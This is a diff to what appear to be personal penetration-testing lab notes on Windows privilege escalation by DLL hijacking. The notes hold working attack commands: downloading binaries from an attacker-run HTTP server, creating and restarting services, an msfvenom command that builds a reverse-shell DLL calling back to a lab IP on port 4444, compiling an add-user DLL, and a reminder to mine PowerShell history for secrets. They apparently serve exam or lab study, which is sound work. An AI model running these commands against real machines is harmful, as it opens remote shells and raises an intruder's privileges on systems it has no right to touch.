@@ -240,12 +240,24 @@ Restart-Service ReynhSurveillance
 sc.exe start DevService
 
 # missing DLL
+# need to copy the files over to a winprep box to see where the missing DLL is using procmon
+# we only need to be able to stop/start the service, write perms not needed
+New-Item -ItemType Directory -Path C:\Scheduler
+iwr -uri http://192.168.45.219:8000/scheduler.exe -Outfile C:\Scheduler\scheduler.exe
+iwr -uri http://192.168.45.219:8000/customlib.dll -Outfile C:\Scheduler\customlib.dll
+# need to create the service in order to see missing dlls
+New-Service -Name scheduler -BinaryPathName C:\Scheduler\scheduler.exe
+# with procmon filter running we can restart the service
+Restart-Service scheduler
 # shell dll
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll 
 iwr -uri http://192.168.45.219:8000/EnterpriseServiceOptional.exe -Outfile EnterpriseServiceOptional.exe
 # add user dll
 x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
 iwr -uri http://192.168.45.181/myDLL.dll -Outfile myDLL.dll
+# restart service to pick up our shell dll
+net stop scheduler
+Restart-Service scheduler
 ```
 - look for scheduled tasks
 - check powershell history for secrets
